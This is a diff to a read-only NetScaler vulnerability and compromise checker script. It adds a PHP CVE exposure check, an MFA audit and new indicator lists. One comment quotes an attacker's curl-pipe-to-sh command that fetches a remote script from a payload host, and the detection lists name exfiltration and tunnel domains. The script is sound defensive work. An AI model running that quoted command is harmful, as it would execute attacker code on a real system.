@@ -4,11 +4,15 @@
 # NetScaler ADC / Gateway precondition checker for CTX697096
 # (CVE-2026-88771 .. CVE-2026-88778), published 2026-09-27,
 # CTX697174 (CVE-2026-88779, SAML), published 2026-10-03,
-# and CTX697191 (CVE-2026-107406, SAML), published 2026-10-08
+# and CTX697191 (CVE-2026-107406, SAML), published 2026-10-08;
+# v1.17: php2shell (PHP CVE-2026-109618 / CVE-2026-109619, management GUI), published 2026-10-21
 #
-# Version: 1.16 (2026-10-08)
+# Version: 1.17 (2026-10-22)
 # Author : Thomas Poppelgaard - Poppelgaard.com ApS
-# License: MIT (see LICENSE). Provided AS IS, no warranty. Read-only - makes no changes.
+# License: PolyForm Shield 1.0.0 from v1.17 (v1.16 and earlier: MIT), see LICENSE. Provided AS IS, no warranty.
+#          Read-only - makes no changes.
+# Gotham Technology Group indicators are NOT covered by the license and may not be redistributed;
+# checks adapted from Deyda are Apache 2.0. See THIRD-PARTY-NOTICE.md.
 #
 # Usage (on the appliance, in the shell):
 #   sh ctx697096_check.sh                                 full run: fix check + IoC sweep ("am I fixed? was I hacked?")
@@ -39,7 +43,7 @@
 # The precondition patterns follow CTX697096. CVE-2026-88771 applies to every
 # deployment regardless of config, so an affected build is always vulnerable.
 # The IoC sweep is based on unofficial community guidance (incl. checks adapted
-# from Manuel Winkel's NetScaler CVE checklist and triage scripts v9.17, v9.28 and v9.43, deyda.net, and
+# from Manuel Winkel's NetScaler CVE checklist and triage scripts v9.17, v9.28, v9.43 and v9.92, deyda.net, and
 # indicators from Gotham Technology Group's IoC check, shared with permission, and the
 # IoC collection of PitScaler.com with its original sources, Arctic Wolf's alert pack, Unit 42, LevelBlue and TENEX;
 # thanks to Michael Shuster, Ferroque Systems, for review and feedback, and to feiglein74 for the
@@ -47,9 +51,9 @@
 # NOT on Citrix IoCs - a clean result does not prove the appliance was not compromised.
 # =============================================================================
 
-VERSION="1.16"
-IOCDATE="8 Oct 2026"   # public indicators included up to this date
-IOCYMD=20261008        # v1.15: the same date as YYYYMMDD, for the "this copy is getting old" hint
+VERSION="1.17"
+IOCDATE="22 Oct 2026"   # public indicators included up to this date
+IOCYMD=20261022        # v1.15: the same date as YYYYMMDD, for the "this copy is getting old" hint
 START=$(date +%s); EXPT=""
 CONF="/nsconfig/ns.conf"
 DO_IOC=auto   # v1.15: on by default on the appliance, --no-ioc to skip
@@ -157,10 +161,16 @@ if [ -n "$OUTFILE" ] && [ -z "$CTXCHK_CHILD" ]; then
   if [ "$C10" = vulnerable ] && grep -qE 'includes the CTX697096( and CVE-2026-88779)? fixes' "$OUTFILE"; then
     ST=FIXED; case "$V" in VULNERABLE|VULNERABLE_CVE-2026-88779) V=VULNERABLE_CVE-2026-107406 ;; esac
   fi
+  # v1.17: php2shell (PHP CVE-2026-109618/-109619): PHP patched / unpatched / not_checked, and management GUI exposure
+  if grep -q 'has the CVE-2026-109618/-109619 fix' "$OUTFILE"; then PHP2=patched
+  elif grep -q 'is NOT patched for CVE-2026-109618' "$OUTFILE"; then PHP2=unpatched; else PHP2=not_checked; fi
+  if grep -q 'management web server reachable through a load-balancing vserver' "$OUTFILE"; then MGA=lb_exposed
+  elif grep -q 'management GUI open to any source' "$OUTFILE"; then MGA=open
+  elif grep -q 'management GUI restricted by NetScaler ACLs' "$OUTFILE"; then MGA=restricted; else MGA=n/a; fi
   RT=$(sed -n 's/^Done in \([0-9hms ]*\)[.(].*/\1/p' "$OUTFILE" | head -1 | tr -d ' ')
   # v1.15: NSIP from the report's "Appliance:" line ("hidden" with --hide-ip)
   NSIPV=$(sed -n 's/^Appliance: .*  -  NSIP \([^ ]*\)  -  .*/\1/p' "$OUTFILE" | head -1)
-  RESLINE="CTX697096 checker $VERSION: host=$H nsip=${NSIPV:-?} build=${BLD:-?} status=$ST isn=$ISN compromise=$CMP targeted=$TGT saml=$SAML cve88779=$C9 cve107406=$C10 verdict=$V runtime=${RT:-?}"
+  RESLINE="CTX697096 checker $VERSION: host=$H nsip=${NSIPV:-?} build=${BLD:-?} status=$ST isn=$ISN compromise=$CMP targeted=$TGT saml=$SAML cve88779=$C9 cve107406=$C10 php2shell=$PHP2 mgmt=$MGA verdict=$V runtime=${RT:-?}"
   echo "$RESLINE" >> "$OUTFILE"
   if [ "$SUMMARY" -eq 1 ]; then
     # the result line, then the red findings and the verdict
@@ -192,6 +202,7 @@ susp() { printf '  %s[SUSPECT]%s  %s\n'  "$R" "$N" "$1"; }
 ok()   { printf '  %s[not met]%s  %s\n'  "$G" "$N" "$1"; }
 warn() { printf '  %s[CHECK]%s    %s\n'   "$Y" "$N" "$1"; }
 okay() { printf '  %s[OK]%s       %s\n'   "$G" "$N" "$1"; }
+nomfa() { printf '  %s[NO MFA]%s   %s\n' "$R" "$N" "$1"; }
 fixd() { printf '  %s[fixed]%s    %s\n'   "$G" "$N" "$1"; }
 # pre(): a CVE precondition is met. On a fixed build it is mitigated by the firmware,
 # so show it as [met/fixed] instead of [AFFECTED].
@@ -313,7 +324,7 @@ if [ "$PART_MODE" -eq 0 ] && [ -t 1 ] && [ -t 2 ] && [ -z "$CTXCHK_CHILD" ] && [
     _r1="${Y}${B}CVE CHECK${N}   ${G}+${N}   ${R}${B}IoC SWEEP${N}"
     _r2="am I fixed?     was I hacked?"
     _r3="${B}v$VERSION${N} - indicators up to $IOCDATE"
-    _r4="${C}free - open source - read-only${N}"
+    _r4="${C}free - source available - read-only${N}"
     _i=0
     while IFS= read -r _l; do
       _i=$((_i+1))
@@ -614,6 +625,162 @@ fi
 echo
 
 # ---------------------------------------------------------------------------
+# 2d. v1.17: php2shell - PHP CVE-2026-109618 / CVE-2026-109619 (PHP advisory 21 Oct 2026, pre-auth RCE, CVSS 9.2 each).
+#     NetScaler's management GUI runs PHP (Apache mod_php) on the NSIP, on every SNIP/VIP with management access and
+#     on the cluster IP. Gateway and AAA are NOT affected (PHP is off on that path). Citrix (21 Oct): all supported
+#     builds are affected, NetScaler Console and SVM are not, a fixed PHP is in progress; mitigation: restrict GUI/API
+#     access with ACLs (CTX228148). Firmware analysis and stopgaps: Remko Weijnen (14.1-73.46 ships PHP 8.1.34, end of
+#     life). A patched libphp.so exports zend_mm_safe_error_ex and zend_new_array_singleton (Remko Weijnen).
+#     Not a VULNERABLE verdict: only the management interface is exposed, so this is a [CHECK] when it is not restricted.
+# ---------------------------------------------------------------------------
+echo "${B}php2shell - PHP CVE-2026-109618 / CVE-2026-109619 (management GUI only, 21 Oct 2026)${N}"
+# PHP on the appliance: version and whether the fix is in the binary (appliance only, read-only)
+PHPST=unknown; PHPV=""; PHPSO=""
+if [ -d /netscaler ]; then
+  PHPSO=$(grep -iE '^[[:space:]]*LoadModule[[:space:]]+php[0-9_]*module' /etc/httpd.conf 2>/dev/null | awk '{print $3}' | head -1)
+  case "$PHPSO" in /*) ;; ?*) PHPSO="/$PHPSO" ;; esac
+  [ -f "$PHPSO" ] || PHPSO=""
+  [ -n "$PHPSO" ] || for x in /libexec/libphp.so /usr/libexec/libphp.so /usr/local/libexec/apache24/libphp.so; do [ -f "$x" ] && { PHPSO="$x"; break; }; done
+  if [ -n "$PHPSO" ]; then
+    PHPV=$(grep -aoE 'php-[0-9]+\.[0-9]+\.[0-9]+' "$PHPSO" 2>/dev/null | head -1 | sed 's/^php-//')
+    [ -n "$PHPV" ] || PHPV=$(/bin/php -v 2>/dev/null | sed -nE '1s/^PHP ([0-9]+\.[0-9]+\.[0-9]+).*/\1/p')
+    if grep -aq 'zend_mm_safe_error_ex' "$PHPSO" 2>/dev/null && grep -aq 'zend_new_array_singleton' "$PHPSO" 2>/dev/null; then PHPST=patched; else PHPST=unpatched; fi
+  fi
+fi
+# Management addresses from the saved config: NSIP, SNIP/VIP/MIP with management access, cluster IP. A GUI set to
+# DISABLED on an address takes it out. The ACL check plays the saved "add ns acl" rules in priority order for a request
+# from an arbitrary source to ports 80 and 443 (first matching rule wins; default per set l3param -implicitACLAllow).
+MGMT=$(perl -e '
+  my (%ip, %gui, %type, @acl, $nsip); my $impl = "ALLOW";
+  sub ipn { my @o = split /\./, $_[0]; return undef unless @o == 4; return (($o[0]*256+$o[1])*256+$o[2])*256+$o[3] }
+  sub inr { my ($v, $spec) = @_; return 1 unless defined $spec;
+    if ($spec =~ /^([0-9.]+)-([0-9.]+)$/) { my ($a,$b,$x) = (ipn($1), ipn($2), ipn($v)); return defined $x && $x >= $a && $x <= $b }
+    return $spec eq $v }
+  sub inp { my ($p, $spec) = @_; return 1 unless defined $spec;
+    if ($spec =~ /^(\d+)-(\d+)$/) { return $p >= $1 && $p <= $2 } return $spec == $p }
+  while (<>) {
+    s/\r//;
+    if (/^set ns config .*-IPAddress\s+"?([0-9.]+)/i) { $nsip = $1 }
+    if (/^set l3param .*-implicitACLAllow\s+DISABLED/i) { $impl = "DENY" }
+    if (/^(?:add|set) ns ip\s+([0-9.]+)\s*(.*)$/i) {
+      my ($a, $r) = ($1, $2);
+      $type{$a} = uc($1) if $r =~ /-type\s+(\w+)/i;
+      $ip{$a} = 1 if $r =~ /-mgmtAccess\s+ENABLED/i;
+      $ip{$a} = 0 if $r =~ /-mgmtAccess\s+DISABLED/i;
+      $gui{$a} = uc($1) if $r =~ /-gui\s+(\w+)/i;
+    }
+    if (/^add ns acl\s+("[^"]*"|\S+)\s+(ALLOW|DENY|BRIDGE)\b(.*)$/i) {
+      my ($n, $act, $r) = ($1, uc $2, $3); my %a = (name => $n, act => $act);
+      next if $r =~ /-state\s+DISABLED/i;
+      $a{pri} = $r =~ /-priority\s+(\d+)/i ? $1 : 1e9;
+      $a{proto} = uc $1 if $r =~ /-protocol\s+(\w+)/i;
+      for my $k (qw(srcIP destIP destPort)) {
+        if ($r =~ /-$k\s+(!?=)\s+(\S+)/i) { $a{$k} = $2; $a{"${k}op"} = $1 }
+        elsif ($r =~ /-${k}Set\s+\S+/i) { $a{"${k}op"} = "set" } }
+      $a{srcIPop} = "set" if $r =~ /-srcIPSet\s+\S+/i;
+      $a{destIPop} = "set" if $r =~ /-destIPSet\s+\S+/i;
+      push @acl, \%a;
+    }
+  }
+  $ip{$nsip} = 1 if defined $nsip && !exists $ip{$nsip};
+  for my $a (keys %type) { $ip{$a} = 1 if $type{$a} eq "CLIP" && !exists $ip{$a} }
+  my @rules = sort { $a->{pri} <=> $b->{pri} } @acl;
+  for my $a (sort keys %ip) {
+    next unless $ip{$a};
+    next if ($gui{$a} // "") eq "DISABLED";
+    my $role = (defined $nsip && $a eq $nsip) ? "NSIP" : ($type{$a} // "SNIP");
+    my @open;
+    for my $p (80, 443) {
+      my $dec = $impl; my $how = "default";
+      for my $r (@rules) {
+        next if defined $r->{proto} && $r->{proto} ne "TCP";
+        next if ($r->{destIPop} // "") eq "set" || ($r->{srcIPop} // "") eq "set";
+        if (defined $r->{destIP}) { my $m = inr($a, $r->{destIP}); $m = !$m if $r->{destIPop} eq "!="; next unless $m }
+        if (defined $r->{destPort}) { my $m = inp($p, $r->{destPort}); $m = !$m if $r->{destPortop} eq "!="; next unless $m }
+        # does the rule apply to ANY source? An ALLOW/DENY limited to "srcIP = x" applies only to x.
+        next if defined $r->{srcIP} && $r->{srcIPop} eq "=";
+        $dec = $r->{act} eq "DENY" ? "DENY" : "ALLOW"; $how = $r->{name}; last;
+      }
+      push @open, $p if $dec ne "DENY";
+    }
+    print "$a $role " . (@open ? join(",", @open) : "-") . "\n";
+  }
+  my $sets = grep { ($_->{destIPop} // "") eq "set" || ($_->{srcIPop} // "") eq "set" } @acl;
+  print "#ACLSETS $sets\n" if $sets;
+  print "#NSIP $nsip\n" if defined $nsip;
+' "$CONF" 2>/dev/null)
+MGMTA=$(echo "$MGMT" | grep -v '^#' | grep -c .)
+MGMTOPEN=$(echo "$MGMT" | grep -v '^#' | awk '$3 != "-"')
+MGNSIP=$(echo "$MGMT" | sed -n 's/^#NSIP //p')
+# Remko Weijnen's "exception": an LB vserver whose service points at the management web server (own management
+# address or 127.0.0.1, port 80/443) puts the management PHP on the data plane.
+MGIPS=$(echo "$MGMT" | grep -v '^#' | awk '{print $1}' | tr '\n' ' ')
+MGEXP=$(MGIPS="$MGIPS 127.0.0.1 ${MGNSIP}" perl -e '
+  my %t = map { $_ => 1 } grep { length } split /\s+/, $ENV{MGIPS};
+  my (%srv, %svc, %sg, @out);
+  my @l = <>; s/\r// for @l;
+  for (@l) { $srv{$1} = $2 if /^add server\s+("[^"]*"|\S+)\s+([0-9.]+)/i }
+  for (@l) {
+    if (/^add service\s+("[^"]*"|\S+)\s+("[^"]*"|\S+)\s+\S+\s+(\d+)/i) { my ($n,$h,$p) = ($1,$2,$3); my $i = $srv{$h} // $h; $svc{$n} = "$i:$p" if $t{$i} && ($p == 80 || $p == 443) }
+    if (/^bind serviceGroup\s+("[^"]*"|\S+)\s+("[^"]*"|\S+)\s+(\d+)/i) { my ($n,$h,$p) = ($1,$2,$3); my $i = $srv{$h} // $h; $sg{$n} = "$i:$p" if $t{$i} && ($p == 80 || $p == 443) }
+  }
+  for (@l) {
+    if (/^bind lb vserver\s+("[^"]*"|\S+)\s+("[^"]*"|\S+)/i) { my ($v,$s) = ($1,$2); my $d = $svc{$s} // $sg{$s}; push @out, "lb vserver $v uses service $s ($d)" if $d }
+  }
+  print "$_\n" for @out;
+' "$CONF" 2>/dev/null)
+if [ "$PHPST" = patched ]; then
+  fixd "php2shell - PHP ${PHPV:-?} in $PHPSO has the CVE-2026-109618/-109619 fix (zend_mm_safe_error_ex and zend_new_array_singleton present)"
+elif [ "$PHPST" = unpatched ]; then
+  _st="PHP ${PHPV:-?} in $PHPSO is NOT patched for CVE-2026-109618/-109619 (pre-auth RCE, 9.2) - Citrix: all supported builds affected, fix pending"
+elif [ -d /netscaler ]; then
+  _st="PHP module not found via /etc/httpd.conf, so the PHP version was not checked - Citrix: all supported builds affected, fix pending"
+else
+  _st="PHP not checked here (offline config) - Citrix: all supported builds affected, fix pending"
+fi
+if [ "$PHPST" != patched ]; then
+  if [ -n "$MGEXP" ]; then
+    warn "php2shell - management web server reachable through a load-balancing vserver: the vulnerable PHP is on the data plane"
+    echo "$MGEXP" | show 5
+    note "$_st."
+    note "Remove that binding, or treat the appliance as exposed wherever that vserver is reachable (Remko Weijnen)."
+    FOLLOWUP=1
+  fi
+  if [ "$MGMTA" -eq 0 ]; then
+    warn "php2shell - no management address found in the config (NSIP / management access). $_st."
+    FOLLOWUP=1
+  elif [ -n "$MGMTOPEN" ]; then
+    warn "php2shell - management GUI open to any source in the NetScaler ACLs. $_st:"
+    echo "$MGMTOPEN" | awk '{printf "%s (%s) - port(s) %s open\n", $1, $2, $3}' | show 8
+    note "Restrict GUI/API access to admin hosts and NetScaler Console (Citrix CTX228148), on the NSIP, every SNIP with"
+    note "management access and the cluster IP - put the ALLOW rules first, or you lock yourself out:"
+    note "  add ns acl allow-adm-443 ALLOW -srcIP = <Console_IP/Admin_IP> -destIP = <IP> -destPort = 443 -protocol TCP -priority 2"
+    note "  add ns acl deny-rest-all-443 DENY -destIP = <IP> -destPort = 443 -protocol TCP -priority 4   (same for port 80)"
+    note "  apply ns acls ; save ns config"
+    note "Already limited by a firewall in front of the NSIP/SNIP? Then this is covered - the checker only sees NetScaler ACLs."
+    echo "$MGMT" | grep -q '^#ACLSETS' && note "Some ACLs use IP sets, which are not evaluated here - check them by hand."
+    FOLLOWUP=1
+  else
+    okay "php2shell - management GUI restricted by NetScaler ACLs on all $MGMTA management address(es) (ports 80 and 443)"
+    note "$_st. Keep it restricted until Citrix ships the fixed build."
+  fi
+  # Stopgap status (Remko Weijnen, checked against 14.1-73.46) - information only, never changes the verdict
+  if [ -d /netscaler ]; then
+    PINI=$(grep -iE '^[[:space:]]*PHPIniDir' /etc/httpd.conf 2>/dev/null | awk '{gsub(/"/,"",$2); print $2}' | head -1)
+    [ -n "$PINI" ] && [ -d "$PINI" ] && PINI="$PINI/php.ini"; [ -f "${PINI:-x}" ] || PINI=/usr/local/lib/php.ini
+    phpset() { _v=$(grep -iE "^[[:space:]]*php_(admin_)?(value|flag)[[:space:]]+$1[[:space:]]" /etc/httpd.conf 2>/dev/null | tail -1 | awk '{print $3}')
+               [ -n "$_v" ] && { echo "$_v (httpd.conf)"; return; }
+               _v=$(grep -iE "^[[:space:]]*$1[[:space:]]*=" "$PINI" 2>/dev/null | tail -1 | sed -E 's/^[^=]*=[[:space:]]*//; s/[[:space:]]*;.*$//')
+               echo "${_v:-${2}}"; }
+    UPP=$(phpset session.upload_progress.enabled "On (default)"); PMS=$(phpset post_max_size "8M (default)")
+    MLIM=$(phpset memory_limit "128M (default)")
+    note "PHP stopgaps (Remko Weijnen): session.upload_progress.enabled = $UPP; post_max_size = $PMS; memory_limit = $MLIM"
+    case "$UPP" in [Oo]ff*|0*) ;; *) note "Not applied. The ACL restriction is the main fix; PHP settings only reduce the exposure (see the README)." ;; esac
+  fi
+fi
+echo
+
+# ---------------------------------------------------------------------------
 # 3. Upgrade risks (from Citrix Tech Zone guidance for CTX697096)
 # ---------------------------------------------------------------------------
 echo "${B}Upgrade risk${N}"
@@ -694,6 +861,101 @@ if [ "$PART_MODE" -eq 0 ]; then
   fi
   echo
 fi
+
+# ---------------------------------------------------------------------------
+# 3c. Authentication: is MFA configured AND bound on every Gateway vserver?
+# Stolen passwords (LDAP bind theft, config theft via the injection) are only enough
+# where a Gateway asks for one factor. Walks, per vpn vserver, the auth policies that are
+# actually BOUND: classic (primary / -secondary) and nFactor (authnProfile -> AAA vserver
+# -> -nextFactor policy labels). A factor level counts when one of its policies uses a real
+# identity action (LDAP, RADIUS, SAML, OAuth, cert, OTP, email, push, Kerberos, local).
+# NO_AUTHN, EPA, captcha and LDAP group extraction (-authentication DISABLED, no OTP) do not.
+# ---------------------------------------------------------------------------
+echo "${B}Authentication (MFA)${N}"
+MFA=$(perl -ne '
+  BEGIN { $|=1 }
+  chomp; s/\r$//;
+  my @t = /("(?:[^"\\]|\\.)*"|\S+)/g; s/^"(.*)"$/$1/ for @t;
+  next unless @t >= 3;
+  my %o; for (my $i=0; $i<@t; $i++) { if ($t[$i] =~ /^-(\w+)$/) { $o{lc $1} = ($i+1<@t && $t[$i+1] !~ /^-\w+$/) ? $t[$i+1] : 1 } }
+  my $l = lc "$t[0] $t[1] $t[2]";
+  if ($l =~ /^add authentication (\w+)action$/ && @t > 3) {
+    my ($ty,$n) = (lc $1, $t[3]); $ty =~ s/^(ldap|radius|saml|cert|oauth|tacacs|negotiate|webauth|email|push|epa|captcha|noauth|dfa|citrixauth|storefrontauth|samlidp)$/$1/;
+    $act{$n} = $ty; $nofac{$n} = 1 if $ty eq "ldap" && ($o{authentication}||"") =~ /^disabled$/i && !$o{otpsecret};
+    $otp{$n} = 1 if $ty eq "ldap" && $o{otpsecret}; $samlurl{$n} = $o{samlredirecturl} if $ty eq "saml";
+  }
+  elsif ($l eq "add authentication policy" && @t > 3)               { $pa{$t[3]} = $o{action}; $pr{$t[3]} = $o{rule} }
+  elsif ($l =~ /^add authentication (\w+)policy$/ && @t > 3 && lc($1) !~ /^(loginschema|policy)$/) {
+    my $ty = lc $1; $pa{$t[3]} = ($ty eq "local") ? "LOCAL" : $t[5]; $pr{$t[3]} = $t[4] // "ns_true";
+  }
+  elsif ($l eq "add authentication authnprofile" && @t > 3)          { $prof{$t[3]} = $o{authnvsname} }
+  elsif ($l eq "add vpn vserver" && @t > 3) {
+    push @vs, $t[3]; $vprof{$t[3]} = $o{authnprofile}; $voff{$t[3]} = 1 if ($o{authentication}||"") =~ /^off$/i;
+  }
+  elsif ($l =~ /^bind (vpn vserver|authentication vserver|authentication policylabel)$/ && @t > 3) {
+    my $p = $o{policy} // $o{policyname}; next unless defined $p;
+    my $kind = ($l =~ /vpn/) ? "v" : ($l =~ /policylabel/) ? "l" : "a";
+    push @{ $b{"$kind:$t[3]"} }, [ $p, $o{nextfactor}, $o{secondary} ? 1 : 0 ];
+  }
+  END {
+    sub fac { my $p = shift; my $a = $pa{$p}; return undef unless defined $a;
+      return undef if ($pr{$p}//"") =~ /^(false|ns_false)$/i;
+      return "local" if $a eq "LOCAL"; return undef if $a =~ /^NO_AUTHN$/i;
+      my $ty = $act{$a}; return undef unless defined $ty;
+      return undef if $ty =~ /^(epa|captcha|noauth|samlidp)$/ || $nofac{$a};
+      return $otp{$a} ? "otp" : $ty }
+    sub cond { my $p = shift; my $r = $pr{$p} // "true"; return ($r =~ /^"?(true|ns_true)"?$/i) ? "" : $r }
+    for my $v (@vs) {
+      if ($voff{$v}) { print "NOAUTH\t$v\t-authentication OFF\n"; next }
+      my (@lv, @start, %seen);
+      if ($vprof{$v} && $prof{$vprof{$v}}) { @start = @{ $b{"a:".$prof{$vprof{$v}}} // [] } }
+      else {
+        my @all = grep { defined $pa{$_->[0]} } @{ $b{"v:$v"} // [] };
+        @start = grep { !$_->[2] } @all; my @sec = grep { $_->[2] } @all;
+        if (@sec) { push @lv, [ map { [$_->[0], fac($_->[0]), cond($_->[0])] } @start ]; @start = @sec;
+          push @lv, [ map { [$_->[0], fac($_->[0]), cond($_->[0])] } @start ]; @start = () }
+      }
+      my @cur = @start;
+      for (my $d = 0; $d < 6 && @cur; $d++) {
+        push @lv, [ map { [$_->[0], fac($_->[0]), cond($_->[0])] } @cur ];
+        my @nx; for my $e (@cur) { my $nl = $e->[1]; next unless $nl && !$seen{$nl}++; push @nx, @{ $b{"l:$nl"} // [] } }
+        @cur = @nx;
+      }
+      my @real = grep { grep { defined $_->[1] } @$_ } @lv;
+      my $n = scalar @real;
+      my @desc; my $cnd = ""; my $i = 0;
+      for my $L (@real) { $i++; my %ty; my @c;
+        for my $e (grep { defined $_->[1] } @$L) { $ty{$e->[1]}++; push @c, $e->[2] if $e->[2] ne "" }
+        push @desc, "factor $i: ".join("/", map { uc } sort keys %ty);
+        $cnd = $c[0] if $i >= 2 && @c && @c == scalar(grep { defined $_->[1] } @$L) && !$cnd }
+      my %all; for my $L (@real) { $all{$_->[1]}++ for grep { defined $_->[1] } @$L }
+      my $kind = !$n ? "NONE" : $n >= 2 ? ($cnd ? "COND" : "MFA")
+               : (keys %all == 1 && ($all{saml} || $all{oauth})) ? "IDP"
+               : (keys %all == 1 && $all{radius}) ? "RADIUS" : "SINGLE";
+      my $extra = ""; if ($kind eq "IDP" && keys %samlurl == 1) { ($extra) = values %samlurl; $extra //= "" }
+      print join("\t", $kind, $v, join(", ", @desc), $cnd || $extra), "\n";
+    }
+  }' "$CONF")
+if [ -z "$MFA" ]; then
+  okay "No Gateway (vpn) vservers - nothing to check"
+else
+  printf '%s\n' "$MFA" | while IFS="$(printf '\t')" read -r k v d x; do
+    case "$k" in
+      MFA)    okay "$v: MFA bound ($d)" ;;
+      COND)   warn "$v: second factor is CONDITIONAL ($d) - only asked when: $x"
+              note "Confirm the condition does not let external users skip it (e.g. a client-IP or group rule)." ;;
+      IDP)    warn "$v: login via external IdP ($d) - MFA has to be enforced THERE (e.g. Entra Conditional Access)${x:+: $x}" ;;
+      RADIUS) warn "$v: one factor via RADIUS ($d) - MFA only if the RADIUS server is an OTP/MFA service (NPS extension, RSA, ...)" ;;
+      SINGLE) nomfa "$v: single factor ($d). A stolen password is enough to log on." ;;
+      NOAUTH) nomfa "$v: authentication is switched OFF on this Gateway vserver ($d)" ;;
+      NONE)   warn "$v: no authentication policy bound - unused/dummy vserver, or authentication set up outside the checked config" ;;
+    esac
+  done
+  # v1.17 (PR #6): hardening - like the other hardening hints, MFA findings do not change the verdict; only a Gateway
+  # with authentication switched OFF does
+  printf '%s\n' "$MFA" | grep -qE '^NOAUTH[[:space:]]' && FOLLOWUP=1
+fi
+echo
 
 # ---------------------------------------------------------------------------
 # 4. Optional IoC sweep with public indicators (appliance only)
@@ -1154,8 +1416,13 @@ $line" ;;
     case "$CFDP" in
       -????-??-?" root") NOBODYPS=$(echo "$NOBODYPS" | grep -vE '^([^ ]+ +){10}/netscaler/cfdgetstream( |$)') ;;
     esac
+    # v1.17 (Citrix IoC blog, updated 21 Oct): "nobody <defunct>" entries are a known false alarm (Citrix's own IoC scan
+    # v4 shows them on clean appliances) - an exited process waiting for its parent, nothing is running. Left out, counted.
+    NBZ=$(printf '%s\n' "$NOBODYPS" | grep -c '<defunct>')
+    NOBODYPS=$(printf '%s\n' "$NOBODYPS" | grep -v '<defunct>' | grep -v '^$')
     [ -n "$NOBODYPS" ] && { warn "Processes running as 'nobody' other than httpd:"; echo "$NOBODYPS" | show 10; FOLLOWUP=1; } \
                        || okay "No unexpected 'nobody' processes"
+    [ "${NBZ:-0}" -gt 0 ] && note "$NBZ 'nobody <defunct>' entry(ies) ignored: exited processes, a known false alarm (Citrix IoC scan v4 shows them too)"
 
     # --- Log checks ------------------------------------------------------------
     prog "[3/6] Logs: HTTP errors, VPN clients, login-page injection"
@@ -1450,10 +1717,14 @@ $SHXL"
     # + v1.16 community report (World of EUC Slack, 8 Oct): new overnight wave, pitboss login injection
     #   curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=<key>|sh - payload host v5v.in, IP 72.5.65.111
     GN_IPS="$GN_IPS 72.5.65.111"
+    # + v1.17 Zscaler ThreatLabz (16 Oct): payload host 209.141.43.95 (serves /files/kw2-freebsd-x64-s11, saved as /var/kw2s11)
+    GN_IPS="$GN_IPS 209.141.43.95"
     GN_IPRE=$(echo "$GN_IPS" | sed -e 's/\./\\./g' -e 's/ /|/g')
     # v1.12: pyrlnk.cc removed - an unregistered spelling variant of pylrk.cc (WHOIS, DNS and CT logs show only pylrk.cc,
     # registered 2 Oct; issue #3, Emil Stahl / PitScaler.com)
-    GN_DOM='pylrk\.cc|oast\.fun|dnsl\.cc|gs\.thc\.org|echvista\.com|entretiensol\.com|white-guard\.pro|gsocket\.io|garyvard\.com|hickoryusedauto\.com|gurerasfalt\.com|rockinroyaltykids\.com|currydownsrvpark\.com|webhook\.site|dnshook\.site|pinggy\.net|serveousercontent\.com|v5v\.in'
+    GN_DOM='pylrk\.cc|oast\.fun|dnsl\.cc|gs\.thc\.org|echvista\.com|entretiensol\.com|white-guard\.pro|gsocket\.io|garyvard\.com|hickoryusedauto\.com|gurerasfalt\.com|rockinroyaltykids\.com|currydownsrvpark\.com|webhook\.site|dnshook\.site|pinggy\.net|serveousercontent\.com|v5v\.in|ctrxsrv\.com|ddns\.1433\.eu\.org|css\.staticship\.org|smartdnslog\.com'
+    # watchTowr IoC list for CVE-2026-88771 (9 Oct): OOB callback domains ctrxsrv.com (look-alike), ddns.1433.eu.org,
+    #   css.staticship.org, oob.smartdnslog.com
     # v1.16 community report (8 Oct): v5v.in - payload host of the overnight pitboss wave (r.sh?k=<key>|sh)
     # v1.15 Huntback.io (7 Oct): pinggy.net / serveousercontent.com - SSH tunnel services that fronted two droppers
     # v1.12: webhook.site / dnshook.site - request-capture services used for exfiltration in the second wave (Beazley, via Gotham)
@@ -1464,6 +1735,9 @@ $SHXL"
     #   Gateway logs during the 2 Oct SAML crash wave (79.141.161.139, 216.252.238.222) - hunting leads, not attack proof.
     # Cloudflare WARP egress addresses (104.28.x) are left out - they are shared by ordinary users.
     OPP_IPRE='165\.227\.201\.112|173\.231\.39\.244|64\.225\.103\.14|182\.101\.54\.57|120\.28\.233\.211|149\.28\.58\.71|23\.234\.111\.22|198\.13\.159\.233|85\.221\.203\.85|46\.150\.68\.55|159\.26\.103\.184|45\.249\.89\.172|197\.52\.9\.138|180\.242\.113\.168|85\.117\.117\.248|73\.43\.85\.7|88\.180\.103\.22|194\.28\.195\.90|95\.63\.246\.50|31\.13\.192\.160|185\.170\.55\.89|104\.203\.50\.26|37\.19\.221\.171|45\.143\.167\.96|206\.232\.71\.215|130\.94\.106\.141|58\.187\.56\.89|171\.106\.10\.118|82\.24\.212\.15|178\.66\.43\.241|185\.209\.15\.246|94\.190\.77\.195|93\.177\.60\.233|68\.46\.140\.222|178\.218\.40\.232|49\.36\.107\.103|191\.37\.30\.194|72\.73\.231\.73|95\.229\.84\.239|113\.137\.102\.68|47\.243\.125\.255|47\.76\.92\.109|8\.217\.173\.25|8\.210\.67\.91|47\.239\.205\.29|47\.76\.132\.65|8\.218\.219\.56|47\.76\.102\.1|47\.76\.63\.52|8\.210\.119\.74|64\.177\.93\.71|44\.252\.255\.141|194\.242\.130\.193|125\.122\.56\.47|23\.132\.164\.35|54\.70\.59\.128|44\.226\.128\.41|4\.246\.63\.96|76\.36\.174\.5|100\.40\.202\.26|47\.227\.98\.207|71\.163\.176\.214|97\.205\.234\.34|98\.29\.80\.205|24\.126\.15\.56|74\.99\.67\.70|96\.248\.121\.105|204\.210\.216\.23|76\.72\.187\.172|153\.66\.69\.45|209\.79\.172\.70|71\.163\.14\.19|99\.110\.24\.72|45\.36\.42\.217|66\.188\.65\.11|173\.77\.155\.230|73\.22\.64\.16|199\.79\.241\.36|68\.99\.0\.48|67\.224\.124\.236|74\.244\.147\.208|142\.129\.220\.168|184\.12\.39\.60|209\.99\.184\.231|114\.37\.217\.107|210\.252\.36\.116|27\.98\.42\.70|114\.181\.20\.159|202\.60\.177\.157|13\.59\.243\.24|185\.218\.86\.25|79\.141\.161\.139|216\.252\.238\.222'
+    # + v1.17 Zscaler ThreatLabz (16 Oct): CVE-2026-88771 exploitation sources (bursts of 26+ addresses within minutes). Many are
+    #   consumer or carrier-NAT addresses (PitScaler.com), so hunting leads only. 82.167.14.7 and 130.12.182.7 are already red.
